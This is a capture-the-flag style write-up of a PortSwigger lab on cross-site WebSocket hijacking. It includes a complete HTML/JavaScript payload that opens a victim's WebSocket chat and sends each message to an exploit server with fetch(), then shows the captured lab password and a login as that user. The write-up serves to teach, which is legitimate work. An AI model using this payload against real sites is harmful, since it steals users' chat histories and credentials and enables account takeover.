# Cross-site WebSocket hijacking

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab), you'll learn: Cross-site WebSocket hijacking! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Background

This online shop has a live chat feature implemented using [WebSockets](https://portswigger.net/web-security/websockets).

To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a [cross-site WebSocket hijacking attack](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) to exfiltrate the victim's chat history, then use this gain access to their account.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/WebSockets/WS-3/images/Pasted%20image%2020221219020342.png)

**Live chat:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/WebSockets/WS-3/images/Pasted%20image%2020221219020516.png)

In the previous labs, we found that the live chat is vulnerable to XSS(Cross-Site Scripting).

**To intercept WebSocket traffics, we can use Burp Suite:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/WebSockets/WS-3/images/Pasted%20image%2020221219020713.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/WebSockets/WS-3/images/Pasted%20image%2020221219020720.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/WebSockets/WS-3/images/Pasted%20image%2020221219020726.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/WebSockets/WS-3/images/Pasted%20image%2020221219020741.png)

**Refresh the page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/WebSockets/WS-3/images/Pasted%20image%2020221219021116.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/WebSockets/WS-3/images/Pasted%20image%2020221219021609.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/WebSockets/WS-3/images/Pasted%20image%2020221219021146.png)

In the above requests, we can see that **it's vulnerable to CSRF(Cross-Site Request Forgery), as the GET request to `/chat` is only using a `session` cookie, no CSRF token or unpredictable values in request parameters.**

If the WebSocket handshake request is vulnerable to CSRF, then an attacker's web page can perform a cross-site request to open a WebSocket on the vulnerable site!

**To do so, I'll craft a HTML form that automatically send a WebSocket request to `/chat` with message `READY`, and exfiltrate the victim's chat history:**
```html
<html>
    <head>
        <title>Cross-site WebSocket hijacking</title>
    </head>
    <body>
        <script>
	        // Create a new WebSocket object that points to /chat endpoint
            var webSocket = new WebSocket('wss://0a3c001503003fdec15a8fb1002000a3.web-security-academy.net/chat');
            webSocket.onopen = function() {
	            // Send "READY" message to /chat to render the chat history
                webSocket.send("READY");
            };
            webSocket.onmessage = function(event) {
	            // Send a GET request with the chat history to exploit server 
                fetch('https://exploit-0a4f00e603833f76c1a48e8b017f0066.exploit-server.net/?'+event.data, {method: 'GET'});
            };
        </script>
    </body>
</html>
```

**Next, we can copy and paste that to the exploit server:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/WebSockets/WS-3/images/Pasted%20image%2020221219024639.png)

**Then send the CSRF payload to the victim:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/WebSockets/WS-3/images/Pasted%20image%2020221219024717.png)

**Finally, we can check the access log:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/WebSockets/WS-3/images/Pasted%20image%2020221219024731.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/WebSockets/WS-3/images/Pasted%20image%2020221219024756.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/WebSockets/WS-3/images/Pasted%20image%2020221219024939.png)

```
{"user":"You","content":"I forgot my password"}
{"user":"Hal Pline","content":"No problem carlos, it&apos;s 3tgu7yhedoahtz94rxch"}
{"user":"Hal Pline","content":"Hello, how can I help?"}
{"user":"You","content":"Thanks, I hope this doesn&apos;t come back to bite me!"}
{"user":"CONNECTED","content":"-- Now chatting with Hal Pline --"}
```

**Found `carlos` password! `3tgu7yhedoahtz94rxch`.**

**Let's login as carlos!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/WebSockets/WS-3/images/Pasted%20image%2020221219025024.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/WebSockets/WS-3/images/Pasted%20image%2020221219025032.png)

We're user `carlos`!

# What we've learned:

1. Cross-site WebSocket hijacking